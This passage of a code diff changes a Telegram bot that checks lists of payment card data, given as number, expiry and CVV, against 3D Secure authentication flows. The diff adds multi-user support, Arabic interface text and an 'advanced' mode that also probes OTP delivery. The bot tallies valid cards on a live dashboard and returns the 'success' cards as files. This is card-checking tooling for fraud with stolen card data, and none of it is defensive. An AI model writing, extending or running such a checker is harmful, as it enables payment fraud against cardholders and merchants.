-                'R': ('R', 'Rejected'),
-            }
-            
-            if trans_status in status_map:
-                result = status_map[trans_status]
-                logger.info(f"✅ Final: {result[0]} - {result[1]}")
-                return result
-            
-            logger.error(f"❌ Unknown transStatus: {trans_status}")
-            return ('DECLINED', f'Unknown: {trans_status}')
-            
-        except requests.exceptions.Timeout:
-            logger.error("⏱️ Timeout")
-            return 'ERROR', 'Timeout'
-        except requests.exceptions.ConnectionError:
-            logger.error("🌐 Connection error")
-            return 'ERROR', 'Connection failed'
+            return "FAILED", f"فشل AUTH: {result_code}", "\n".join(debug_log)
+                
+        except requests.Timeout:
+            return "ERROR", "انتهى الوقت", "\n".join(debug_log)
+        except requests.RequestException as e:
+            debug_log.append(f"Request Error: {str(e)}")
+            return "ERROR", str(e)[:30], "\n".join(debug_log)
         except Exception as e:
-            logger.error(f"💥 Exception: {e}")
-            import traceback
-            logger.error(traceback.format_exc())
-            return 'ERROR', str(e)[:50]
+            debug_log.append(f"Exception: {str(e)}")
+            return "ERROR", str(e)[:30], "\n".join(debug_log)
 
-async def send_result(bot_app, card, status_type, message):
+async def send_result(bot_app, card, status_type, message, debug_info, user_id):
     try:
-        card_number = stats['authenticated'] + stats['challenge'] + stats['attempted']
-        status_emojis = {'Y': ('✅', 'AUTHENTICATED', 'Y - Authenticated'), 'C': ('⚠️', 'CHALLENGE', 'C - Challenge'), 'A': ('🔵', 'ATTEMPTED', 'A - Attempted')}
+        stats = get_user_stats(user_id)
+        card_number = stats['success_3ds'] + stats['failed']
         
-        if status_type not in status_emojis:
-            return
-        
-        emoji, title, status_text = status_emojis[status_type]
-        text = f"{emoji} **{title}**\n\n💳 `{card}`\n🔥 {status_text}\n📊 #{card_number}\n📍 {message}"
-        
-        if status_type == 'Y':
-            stats['authenticated_cards'].append(card)
-        elif status_type == 'C':
-            stats['challenge_cards'].append(card)
-        elif status_type == 'A':
-            stats['attempted_cards'].append(card)
-        
-        await bot_app.bot.send_message(chat_id=stats['chat_id'], text=text, parse_mode='Markdown')
+        if status_type == 'SUCCESS':
+            mode_emoji = "🔍" if stats['check_mode'] == 'advanced' else "⚡"
+            text = (
+                "╔═══════════════════╗\n"
+                f"✅ **3D SECURE SUCCESS** {mode_emoji}\n"
+                "╚═══════════════════╝\n\n"
+                f"💳 `{card}`\n"
+                f"🔥 Status: **{message}**\n"
+                f"📊 Card #{card_number}\n"
+                "╚═══════════════════╝"
+            )
+            stats['success_cards'].append(card)
+            
+            await bot_app.bot.send_message(
+                chat_id=stats['chat_id'],
+                text=text,
+                parse_mode='Markdown'
+            )
     except Exception as e:
-        logger.error(f"Send error: {e}")
+        print(f"[!] Error: {e}")
 
-async def check_card(card, bot_app):
+async def check_card(card, bot_app, user_id):
+    stats = get_user_stats(user_id)
+    
     if not stats['is_running']:
-        return card, "STOPPED", "Stopped"
+        return card, "STOPPED", "تم الإيقاف"
     
     parts = card.strip().split('|')
     if len(parts) != 4:
         stats['errors'] += 1
         stats['checking'] -= 1
         stats['last_response'] = 'Format Error'
-        await update_dashboard(bot_app)
-        return card, "ERROR", "Invalid format"
-    
-    card_number, exp_month, exp_year, cvv = [p.strip() for p in parts]
-    card_number = card_number.replace(' ', '').replace('-', '')
-    exp_month = exp_month.zfill(2)
-    if len(exp_year) == 4:
-        exp_year = exp_year[-2:]
+        await update_dashboard(bot_app, user_id)
+        return card, "ERROR", "صيغة خاطئة"
     
     try:
         if not stats['is_running']:
             stats['checking'] -= 1
-            return card, "STOPPED", "Stopped"
+            return card, "STOPPED", "تم الإيقاف"
         
-        checker = StripeChecker()
-        status, message = checker.check(card_number, exp_month, exp_year, cvv)
+        checker = CardChecker(check_mode=stats['check_mode'])
+        status, message, debug_info = checker.check(card)
         
-        status_handlers = {
-            'Y': ('authenticated', 'Auth ✅'),
-            'C': ('challenge', 'Challenge ⚠️'),
-            'A': ('attempted', 'Attempted 🔵'),
-            'N': ('not_auth', 'Not Auth ❌'),
-            'U': ('unavailable', 'Unavailable 🔴'),
-            'R': ('rejected', 'Rejected ❌'),
-            'DECLINED': ('declined', 'Declined ❌'),
-        }
-        
-        if status in status_handlers:
-            stat_key, response_text = status_handlers[status]
-            stats[stat_key] += 1
+        if status == 'SUCCESS':
+            stats['success_3ds'] += 1
             stats['checking'] -= 1
-            stats['last_response'] = response_text
-            await update_dashboard(bot_app)
+            stats['last_response'] = '3DS Success ✅'
+            await update_dashboard(bot_app, user_id)
+            await send_result(bot_app, card, "SUCCESS", message, debug_info, user_id)
+            return card, "SUCCESS", message
             
-            if status in ['Y', 'C', 'A']:
-                await send_result(bot_app, card, status, message)
+        elif status == 'FAILED':
+            stats['failed'] += 1
+            stats['checking'] -= 1
+            stats['last_response'] = 'Failed ❌'
+            await update_dashboard(bot_app, user_id)
+            return card, "FAILED", message
             
-            return card, status, message
         else:
             stats['errors'] += 1
             stats['checking'] -= 1
-            stats['last_response'] = f'{status[:20]}'
-            await update_dashboard(bot_app)
-            return card, status, message
+            stats['last_response'] = f'Error: {message[:20]}'
+            await update_dashboard(bot_app, user_id)
+            return card, "ERROR", message
+            
     except Exception as e:
         stats['errors'] += 1
         stats['checking'] -= 1
         stats['last_response'] = f'Error: {str(e)[:20]}'
-        await update_dashboard(bot_app)
+        await update_dashboard(bot_app, user_id)
         return card, "EXCEPTION", str(e)
 
-def create_dashboard_keyboard():
+def create_dashboard_keyboard(user_id):
+    stats = get_user_stats(user_id)
     elapsed = 0
     if stats['start_time']:
         elapsed = int((datetime.now() - stats['start_time']).total_seconds())
     mins, secs = divmod(elapsed, 60)
     hours, mins = divmod(mins, 60)
     
+    mode_text = "🔍 متقدم" if stats['check_mode'] == 'advanced' else "⚡ أساسي"
+    
     keyboard = [
-        [InlineKeyboardButton(f"🔥 Total: {stats['total']}", callback_data="total")],
-        [InlineKeyboardButton(f"🔄 Checking: {stats['checking']}", callback_data="checking"), InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")],
-        [InlineKeyboardButton(f"✅ Y: {stats['authenticated']}", callback_data="authenticated"), InlineKeyboardButton(f"⚠️ C: {stats['challenge']}", callback_data="challenge")],
-        [InlineKeyboardButton(f"🔵 A: {stats['attempted']}", callback_data="attempted"), InlineKeyboardButton(f"❌ N: {stats['not_auth']}", callback_data="not_auth")],
-        [InlineKeyboardButton(f"🔴 U: {stats['unavailable']}", callback_data="unavailable"), InlineKeyboardButton(f"❌ R: {stats['rejected']}", callback_data="rejected")],
-        [InlineKeyboardButton(f"❌ Declined: {stats['declined']}", callback_data="declined"), InlineKeyboardButton(f"⚠️ Errors: {stats['errors']}", callback_data="errors")],
-        [InlineKeyboardButton(f"🔄 Cart OK: {stats['cart_refreshed']}", callback_data="cart_refresh"), InlineKeyboardButton(f"❌ Cart Failed: {stats['cart_refresh_failed']}", callback_data="cart_failed")],
-        [InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")]
+        [InlineKeyboardButton(f"🔥 الإجمالي: {stats['total']}", callback_data="total")],
+        [
+            InlineKeyboardButton(f"🔄 يتم الفحص: {stats['checking']}", callback_data="checking"),
+            InlineKeyboardButton(f"⏱ {hours:02d}:{mins:02d}:{secs:02d}", callback_data="time")
+        ],
+        [
+            InlineKeyboardButton(f"✅ نجح 3DS: {stats['success_3ds']}", callback_data="success"),
+            InlineKeyboardButton(f"❌ فشل: {stats['failed']}", callback_data="failed")
+        ],
+        [
+            InlineKeyboardButton(f"⚠️ أخطاء: {stats['errors']}", callback_data="errors")
+        ],
+        [
+            InlineKeyboardButton(f"📡 {stats['last_response']}", callback_data="response")
+        ],
+        [
+            InlineKeyboardButton(f"وضع الفحص: {mode_text}", callback_data="mode_info")
+        ]
     ]
     
     if stats['is_running']:
-        keyboard.append([InlineKeyboardButton("🛑 Stop", callback_data="stop_check")])
+        keyboard.append([InlineKeyboardButton("🛑 إيقاف الفحص", callback_data="stop_check")])
     
     if stats['current_card']:
         keyboard.append([InlineKeyboardButton(f"🔄 {stats['current_card']}", callback_data="current")])
     
-    keyboard.append([InlineKeyboardButton(f"🛒 Cart: {CART_ID[:15]}...", callback_data="cart_info")])
-    
     return InlineKeyboardMarkup(keyboard)
 
-async def update_dashboard(bot_app):
+async def update_dashboard(bot_app, user_id):
+    stats = get_user_stats(user_id)
     if stats['dashboard_message_id'] and stats['chat_id']:
         try:
-            await bot_app.bot.edit_message_text(chat_id=stats['chat_id'], message_id=stats['dashboard_message_id'], text="📊 **STRIPE 3DS CHECKER**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
+            await bot_app.bot.edit_message_text(
+                chat_id=stats['chat_id'],
+                message_id=stats['dashboard_message_id'],
+                text="📊 **3D SECURE CHECKER - LIVE** 📊",
+                reply_markup=create_dashboard_keyboard(user_id),
+                parse_mode='Markdown'
+            )
         except:
             pass
 
-async def send_final_files(bot_app):
+async def send_final_files(bot_app, user_id):
+    stats = get_user_stats(user_id)
     try:
-        file_configs = [('authenticated_cards', '✅', 'Authenticated (Y)'), ('challenge_cards', '⚠️', 'Challenge (C)'), ('attempted_cards', '🔵', 'Attempted (A)')]
+        if stats['success_cards']:
+            success_text = "\n".join(stats['success_cards'])
+            filename = f"success_3ds_cards_{user_id}.txt"
+            with open(filename, "w") as f:
+                f.write(success_text)
+            await bot_app.bot.send_document(
+                chat_id=stats['chat_id'],
+                document=open(filename, "rb"),
+                caption=f"✅ **3D Secure Success Cards** ({len(stats['success_cards'])} cards)",
+                parse_mode='Markdown'
+            )
+            os.remove(filename)
         
-        for card_type, emoji, caption in file_configs:
-            cards = stats.get(f'{card_type}', [])
-            if cards:
-                filename = f"{card_type}.txt"
-                with open(filename, "w") as f:
-                    f.write("\n".join(cards))
-                
-                with open(filename, "rb") as f:
-                    await bot_app.bot.send_document(chat_id=stats['chat_id'], document=f, caption=f"{emoji} {caption} ({len(cards)})", parse_mode='Markdown')
-                
-                os.remove(filename)
     except Exception as e:
-        logger.error(f"File error: {e}")
+        print(f"[!] خطأ في إرسال الملفات: {e}")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Unauthorized")
+        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
         return
     
-    await update.message.reply_text("📊 **STRIPE 3DS CHECKER**\n\nSend .txt file with cards\nFormat: `number|month|year|cvv`\n\n**Responses:**\n✅ Y - Authenticated\n⚠️ C - Challenge\n🔵 A - Attempted\n❌ N - Not Auth\n🔴 U - Unavailable\n❌ R - Rejected", parse_mode='Markdown')
+    user_id = update.effective_user.id
+    stats = get_user_stats(user_id)
+    
+    keyboard = [
+        [InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")],
+        [InlineKeyboardButton("⚙️ اختيار وضع الفحص", callback_data="select_mode")]
+    ]
+    
+    await update.message.reply_text(
+        "📊 **3D SECURE CHECKER BOT**\n\n"
+        "أرسل ملف .txt يحتوي على البطاقات\n"
+        "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
+        "**أوضاع الفحص:**\n"
+        "⚡ **أساسي**: فحص سريع (3DS فقط)\n"
+        "🔍 **متقدم**: فحص شامل (3DS + حالة OTP)\n\n"
+        f"**الوضع الحالي:** {'🔍 متقدم' if stats.get('check_mode') == 'advanced' else '⚡ أساسي'}\n\n"
+        "✨ **يمكن لعدة مستخدمين الفحص معاً!**",
+        reply_markup=InlineKeyboardMarkup(keyboard),
+        parse_mode='Markdown'
+    )
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Unauthorized")
+        await update.message.reply_text("❌ غير مصرح")
         return
+    
+    user_id = update.effective_user.id
+    stats = get_user_stats(user_id)
     
     if stats['is_running']:
-        await update.message.reply_text("⚠️ Check in progress!")
+        await update.message.reply_text("⚠️ لديك فحص جاري بالفعل! أكمله أو أوقفه أولاً.")
         return
-    
-    await update.message.reply_text("🔍 Verifying cart...")
-    
-    initial_cart = get_quote_id_smart()
-    if initial_cart:
-        await update.message.reply_text(f"✅ Cart ready!\n🛒 `{initial_cart}`", parse_mode='Markdown')
-    else:
-        await update.message.reply_text("⚠️ Cart warning")
     
     file = await update.message.document.get_file()
     file_content = await file.download_as_bytearray()
     cards = [c.strip() for c in file_content.decode('utf-8').strip().split('\n') if c.strip()]
     
+    # إعادة تعيين الإحصائيات للمستخدم
     stats.update({
-        'total': len(cards), 'checking': 0, 'authenticated': 0, 'challenge': 0, 'attempted': 0,
-        'not_auth': 0, 'unavailable': 0, 'declined': 0, 'rejected': 0, 'errors': 0,
-        'cart_refreshed': 0, 'cart_refresh_failed': 0, 'current_card': '', 'last_response': 'Starting...',
-        'cards_checked': 0, 'authenticated_cards': [], 'challenge_cards': [], 'attempted_cards': [],
-        'start_time': datetime.now(), 'is_running': True, 'chat_id': update.effective_chat.id
+        'total': len(cards),
+        'checking': 0,
+        'success_3ds': 0,
+        'failed': 0,
+        'errors': 0,
+        'current_card': '',
+        'last_response': 'Starting...',
+        'cards_checked': 0,
+        'success_cards': [],
+        'start_time': datetime.now(),
+        'is_running': True,
+        'chat_id': update.effective_chat.id
     })
     
-    dashboard_msg = await update.message.reply_text(text="📊 **STRIPE 3DS CHECKER**", reply_markup=create_dashboard_keyboard(), parse_mode='Markdown')
+    dashboard_msg = await update.message.reply_text(
+        text="📊 **3D SECURE CHECKER - LIVE** 📊",
+        reply_markup=create_dashboard_keyboard(user_id),
+        parse_mode='Markdown'
+    )
     stats['dashboard_message_id'] = dashboard_msg.message_id
     
-    await update.message.reply_text(f"✅ Started!\n📊 Total: {len(cards)}\n🛒 Cart: `{CART_ID[:20]}...`", parse_mode='Markdown')
+    mode_text = "🔍 متقدم (مع فحص OTP)" if stats['check_mode'] == 'advanced' else "⚡ أساسي (3DS فقط)"
     
-    asyncio.create_task(process_cards(cards, context.application))
+    await update.message.reply_text(
+        f"✅ تم بدء الفحص!\n\n"
+        f"📊 إجمالي البطاقات: {len(cards)}\n"
+        f"🔄 وضع الفحص: {mode_text}\n"
+        f"⏳ جاري الفحص...",
+        parse_mode='Markdown'
+    )
+    
+    asyncio.create_task(process_cards(cards, context.application, user_id))
 
-async def process_cards(cards, bot_app):
+async def process_cards(cards, bot_app, user_id):
+    stats = get_user_stats(user_id)
+    
     for i, card in enumerate(cards):
         if not stats['is_running']:
-            stats['last_response'] = 'Stopped 🛑'
-            await update_dashboard(bot_app)
+            stats['last_response'] = 'Stopped by user 🛑'
+            await update_dashboard(bot_app, user_id)
             break
         
         stats['checking'] = 1
         parts = card.split('|')
         stats['current_card'] = f"{parts[0][:6]}****{parts[0][-4:]}" if len(parts) > 0 else card[:10]
-        await update_dashboard(bot_app)
+        await update_dashboard(bot_app, user_id)
         
-        await check_card(card, bot_app)
+        await check_card(card, bot_app, user_id)
         stats['cards_checked'] += 1
         
-        if stats['cards_checked'] % 3 == 0:
-            await update_dashboard(bot_app)
+        if stats['cards_checked'] % 5 == 0:
+            await update_dashboard(bot_app, user_id)
         
-        await asyncio.sleep(4)
+        await asyncio.sleep(2)
     
     stats['is_running'] = False
     stats['checking'] = 0
     stats['current_card'] = ''
     stats['last_response'] = 'Completed ✅'
-    await update_dashboard(bot_app)
+    await update_dashboard(bot_app, user_id)
     
-    summary = f"✅ **Completed!**\n\n📊 Total: {stats['total']}\n✅ Y: {stats['authenticated']}\n⚠️ C: {stats['challenge']}\n🔵 A: {stats['attempted']}\n❌ N: {stats['not_auth']}\n🔴 U: {stats['unavailable']}\n❌ R: {stats['rejected']}\n❌ Declined: {stats['declined']}\n⚠️ Errors: {stats['errors']}\n\n🔄 Cart OK: {stats['cart_refreshed']}\n❌ Cart Failed: {stats['cart_refresh_failed']}\n\n📁 Sending files..."
+    mode_text = "🔍 متقدم" if stats['check_mode'] == 'advanced' else "⚡ أساسي"
     
-    await bot_app.bot.send_message(chat_id=stats['chat_id'], text=summary, parse_mode='Markdown')
-    await send_final_files(bot_app)
+    summary_text = (
+        "═══════════════════\n"
+        "✅ **اكتمل الفحص!** ✅\n"
+        "═══════════════════\n\n"
+        f"📊 **الإحصائيات النهائية:**\n"
+        f"🔥 الإجمالي: {stats['total']}\n"
+        f"✅ نجح 3DS: {stats['success_3ds']}\n"
+        f"❌ فشل: {stats['failed']}\n"
+        f"⚠️ أخطاء: {stats['errors']}\n"
+        f"🔧 الوضع: {mode_text}\n\n"
+        "📁 **جاري إرسال الملفات...**"
+    )
     
-    final = f"🎉 **Done!**\n\n🔄 Cart refreshes: {stats['cart_refreshed']}\n❌ Cart failures: {stats['cart_refresh_failed']}\n🛒 Final Cart: `{CART_ID}`\n\n✅ Stripe 3DS - transStatus Only"
-    await bot_app.bot.send_message(chat_id=stats['chat_id'], text=final, parse_mode='Markdown')
+    await bot_app.bot.send_message(
+        chat_id=stats['chat_id'],
+        text=summary_text,
+        parse_mode='Markdown'
+    )
+    
+    await send_final_files(bot_app, user_id)
+    
+    final_text = (
+        "╔═══════════════════╗\n"
+        "🎉 **تم إنهاء العملية بنجاح!** 🎉\n"
+        "╚═══════════════════╝\n\n"
+        "✅ تم إرسال جميع الملفات\n"
+        "📊 شكراً لاستخدامك البوت!\n\n"
+        "⚡️ 3D Secure Gateway"
+    )
+    
+    await bot_app.bot.send_message(
+        chat_id=stats['chat_id'],
+        text=final_text,
+        parse_mode='Markdown'
+    )
 
 async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id not in ADMIN_IDS:
-        await update.message.reply_text("❌ Unauthorized")
+        await update.message.reply_text("❌ غير مصرح - هذا البوت خاص")
         return
 
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
     
     if query.from_user.id not in ADMIN_IDS:
-        await query.answer("❌ Unauthorized", show_alert=True)
+        await query.answer("❌ غير مصرح", show_alert=True)
         return
+    
+    user_id = query.from_user.id
+    stats = get_user_stats(user_id)
     
     try:
         await query.answer()
@@ -627,31 +717,111 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
             stats['is_running'] = False
             stats['checking'] = 0
             stats['last_response'] = 'Stopped 🛑'
-            await update_dashboard(context.application)
+            await update_dashboard(context.application, user_id)
             try:
-                await context.application.bot.send_message(chat_id=stats['chat_id'], text="🛑 **Stopped!**", parse_mode='Markdown')
+                await context.application.bot.send_message(
+                    chat_id=stats['chat_id'],
+                    text="🛑 **تم إيقاف الفحص بواسطة المستخدم!**",
+                    parse_mode='Markdown'
+                )
             except:
                 pass
     
-    elif query.data == "cart_info":
-        cart_info = f"🛒 **Cart Info:**\n\n📋 `{CART_ID}`\n\n🔄 Refreshes: {stats['cart_refreshed']}\n⚡️ Auto-refresh: ON\n✅ transStatus Only"
-        await query.answer(cart_info, show_alert=True)
-
-async def error_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    logger.error(f"Error: {context.error}")
+    elif query.data == "select_mode":
+        keyboard = [
+            [InlineKeyboardButton("⚡ فحص أساسي (3DS فقط)", callback_data="mode_basic")],
+            [InlineKeyboardButton("🔍 فحص متقدم (3DS + حالة OTP)", callback_data="mode_advanced")],
+            [InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main")]
+        ]
+        
+        current_mode = "🔍 متقدم" if stats.get('check_mode', 'basic') == 'advanced' else "⚡ أساسي"
+        
+        await query.edit_message_text(
+            "⚙️ **اختر وضع الفحص:**\n\n"
+            "⚡ **فحص أساسي:**\n"
+            "• فحص سريع للبطاقة\n"
+            "• يتحقق فقط من نجاح 3DS\n"
+            "• لا يفحص حالة إرسال OTP\n\n"
+            "🔍 **فحص متقدم:**\n"
+            "• فحص شامل ودقيق\n"
+            "• يتحقق من نجاح 3DS\n"
+            "• يفحص حالة إرسال OTP\n"
+            "• يعرض تفاصيل إضافية\n\n"
+            f"**الوضع الحالي:** {current_mode}",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+    
+    elif query.data == "mode_basic":
+        stats['check_mode'] = 'basic'
+        await query.answer("✅ تم تفعيل الوضع الأساسي", show_alert=True)
+        
+        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main")]]
+        
+        await query.edit_message_text(
+            "✅ **تم تفعيل الوضع الأساسي!**\n\n"
+            "⚡ **المميزات:**\n"
+            "• فحص سريع وفعال\n"
+            "• يتحقق من نجاح 3DS\n"
+            "• مثالي للفحص السريع للبطاقات\n\n"
+            "📝 يمكنك الآن إرسال ملف البطاقات",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+    
+    elif query.data == "mode_advanced":
+        stats['check_mode'] = 'advanced'
+        await query.answer("✅ تم تفعيل الوضع المتقدم", show_alert=True)
+        
+        keyboard = [[InlineKeyboardButton("🔙 رجوع للقائمة الرئيسية", callback_data="back_to_main")]]
+        
+        await query.edit_message_text(
+            "✅ **تم تفعيل الوضع المتقدم!**\n\n"
+            "🔍 **المميزات:**\n"
+            "• فحص شامل ودقيق\n"
+            "• يتحقق من نجاح 3DS\n"
+            "• يفحص حالة إرسال OTP\n"
+            "• يعرض تفاصيل إضافية:\n"
+            "  - ✅ نجح إرسال الكود\n"
+            "  - ⚠️ خطأ في إرسال الكود\n"
+            "  - ℹ️ حالة غير محددة\n\n"
+            "📝 يمكنك الآن إرسال ملف البطاقات",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+    
+    elif query.data == "back_to_main":
+        keyboard = [
+            [InlineKeyboardButton("📁 إرسال ملف البطاقات", callback_data="send_file")],
+            [InlineKeyboardButton("⚙️ اختيار وضع الفحص", callback_data="select_mode")]
+        ]
+        
+        await query.edit_message_text(
+            "📊 **3D SECURE CHECKER BOT**\n\n"
+            "أرسل ملف .txt يحتوي على البطاقات\n"
+            "الصيغة: `رقم|شهر|سنة|cvv`\n\n"
+            "**أوضاع الفحص:**\n"
+            "⚡ **أساسي**: فحص سريع (3DS فقط)\n"
+            "🔍 **متقدم**: فحص شامل (3DS + حالة OTP)\n\n"
+            f"**الوضع الحالي:** {'🔍 متقدم' if stats.get('check_mode') == 'advanced' else '⚡ أساسي'}\n\n"
+            "✨ **يمكن لعدة مستخدمين الفحص معاً!**",
+            reply_markup=InlineKeyboardMarkup(keyboard),
+            parse_mode='Markdown'
+        )
+    
+    elif query.data == "send_file":
+        await query.answer("📁 أرسل ملف البطاقات الآن", show_alert=True)
+    
+    elif query.data == "mode_info":
+        mode_text = "🔍 متقدم (مع فحص OTP)" if stats['check_mode'] == 'advanced' else "⚡ أساسي (3DS فقط)"
+        await query.answer(f"الوضع الحالي: {mode_text}", show_alert=True)
 
 def main():
-    logger.info("="*50)
-    logger.info("🤖 Stripe 3DS Bot Starting")
-    logger.info("="*50)
-    
-    check_single_instance()
-    
-    initial_cart = get_quote_id_smart()
-    if initial_cart:
-        logger.info(f"✅ Cart verified: {initial_cart[:20]}...")
-    else:
-        logger.warning("⚠️ Cart verification failed")
+    print("[🤖] Starting 3D Secure Telegram Bot...")
+    print("[✅] Multi-User Support Enabled")
+    print("[⚡] Basic Mode: Fast 3DS check only")
+    print("[🔍] Advanced Mode: 3DS + OTP status check")
+    print("[👥] Multiple users can check simultaneously")
     
     app = Application.builder().token(BOT_TOKEN).build()
     
@@ -659,27 +829,10 @@ def main():
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_file))
     app.add_handler(CallbackQueryHandler(button_callback))
-    app.add_error_handler(error_handler)
     
-    logger.info("✅ Bot running")
-    logger.info("="*50)
-    
-    try:
-        app.run_polling(allowed_updates=Update.ALL_TYPES, drop_pending_updates=True, close_loop=False)
-    except KeyboardInterrupt:
-        cleanup_on_exit()
-    except Exception as e:
-        if "Conflict" in str(e):
-            logger.error("❌ Telegram conflict! Check for other instances.")
-        else:
-            logger.error(f"❌ Error: {e}")
-        cleanup_on_exit()
+    print("[✅] Bot is running...")
+    print(f"[👥] Authorized users: {len(ADMIN_IDS)}")
+    app.run_polling()
 
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        cleanup_on_exit()
-    except Exception as e:
-        logger.error(f"Fatal: {e}")
-        cleanup_on_exit()
+    main()
